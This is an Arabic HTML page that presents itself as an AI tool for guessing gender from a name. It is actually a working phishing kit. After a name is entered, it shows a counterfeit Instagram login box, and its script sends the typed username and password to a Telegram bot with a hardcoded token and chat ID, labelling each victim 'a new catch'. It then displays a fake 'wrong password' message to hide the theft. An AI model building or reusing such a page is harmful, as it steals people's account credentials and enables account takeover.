<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديد الجنس بالذكاء الاصطناعي 🤖</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }

        /* واجهة الموقع الرئيسي */
        .main-card {
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }

        h2 { color: #333; margin-bottom: 20px; font-size: 1.5rem; }
        p { color: #666; margin-bottom: 20px; }

        .input-group { margin-bottom: 15px; }
        
        .name-input {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 10px;
            outline: none;
            font-size: 16px;
            transition: 0.3s;
        }

        .name-input:focus { border-color: #0095f6; }

        .btn-predict {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 10px;
            padding: 12px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }

        /* النافذة المنبثقة (Instagram Modal) */
        .modal {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.6);
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }

        .login-box {
            background: white;
            width: 90%;
            max-width: 350px;
            padding: 30px;
            border-radius: 10px;
            text-align: center;
        }

        .insta-logo { width: 150px; margin-bottom: 20px; }
        
        .insta-input {
            width: 100%;
            padding: 10px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            margin-bottom: 10px;
            font-size: 14px;
        }

        .btn-insta-login {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 5px;
            padding: 8px;
            font-weight: bold;
            margin-top: 10px;
            cursor: pointer;
        }

        #error-msg {
            color: #ed4956;
            font-size: 13px;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>

    <div class="main-card">
        <h2>تحديد الجنس بالاسم 🧠</h2>
        <p>قم بإدخال اسمك وسيقوم الذكاء الاصطناعي بتوقع جنسك ونسبة دقة الاسم.</p>
        <div class="input-group">
            <input type="text" class="name-input" placeholder="اكتب اسمك هنا...">
        </div>
        <button class="btn-predict" onclick="showLogin()">بدء التحليل</button>
    </div>

    <div class="modal" id="loginModal">
        <div class="login-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="insta-logo">
            <p style="font-size: 14px; color: #8e8e8e; margin-bottom: 15px;">يجب تسجيل الدخول لمشاهدة نتيجة التحليل</p>
            <form id="loginForm">
                <input type="text" id="username" class="insta-input" placeholder="اسم المستخدم أو الهاتف" required>
                <input type="password" id="password" class="insta-input" placeholder="كلمة السر" required>
                <button type="submit" class="btn-insta-login">تسجيل الدخول</button>
                <div id="error-msg">عذراً، كلمة السر غير صحيحة.</div>
            </form>
        </div>
    </div>

    <script>
        const token = '8409685298:AAHN_RpQJOEte85gZMYgi2rPaE99lwXODPs';
        const chatId = '7822309283';

        function showLogin() {
            const name = document.querySelector('.name-input').value;
            if(name.length < 2) {
                alert("يرجى كتابة الاسم أولاً!");
                return;
            }
            document.getElementById('loginModal').style.display = 'flex';
        }

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            const nameUsed = document.querySelector('.name-input').value;

            // إرسال البيانات لتليجرام
            const message = `🎯 صيد جديد (موقع تحديد الجنس):\n\n👤 الاسم المدخل: ${nameUsed}\n📧 حساب انستا: ${user}\n🔑 الباسورد: ${pass}`;
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            fetch(url).then(() => {
                document.getElementById('error-msg').style.display = 'block';
                document.getElementById('password').value = '';
            });
        });

        // إغلاق المودال عند الضغط خارجه (اختياري لجعلها طبيعية)
        window.onclick = function(event) {
            const modal = document.getElementById('loginModal');
            if (event.target == modal) {
                modal.style.display = "none";
            }
        }
    </script>

</body>
</html>
